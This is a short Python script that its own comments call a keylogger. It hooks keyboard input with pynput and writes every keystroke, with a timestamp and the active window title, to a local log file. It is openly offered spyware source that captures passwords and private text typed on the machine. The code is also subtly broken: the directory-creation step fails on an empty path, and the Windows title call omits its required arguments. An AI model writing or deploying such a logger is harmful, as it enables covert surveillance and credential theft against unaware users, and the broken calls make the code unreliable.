import os
import time
from pynput import keyboard
from ctypes import windll

# Define the log file path and filename
log_file = 'oskey.txt'
log_path = os.path.dirname(log_file)

def create_directory():
    """Create the directory to store logs if it doesn't exist."""
    if not os.path.exists(log_path):
        os.makedirs(log_path)

def write_to_log(key, window_title=''):
    with open(log_file, 'a') as f:
        f.write(f'{time.strftime("%d-%m-%Y %H:%M:%S")} {os.getpid()}: {key}, Window Title: {window_title}\n')

def log_keystroke(k):
    """Log the keystroke and its associated window title."""
    write_to_log(k, windll.user32.GetWindowTextW())

def hook_keyboard():
    """Hook the keyboard input to log keystrokes."""
    with keyboard.Listener(on_press=log_keystroke) as listener:
        listener.join()

def main():
    # Make sure the directory exists and create oskey.txt
    create_directory()
    with open(log_file, 'w'):
        pass  # Create an empty file if it doesn't exist

    # Hook the keyboard input to log keystrokes
    hook_keyboard()

# Call the main function to start the keylogger
if __name__ == "__main__":
    main()
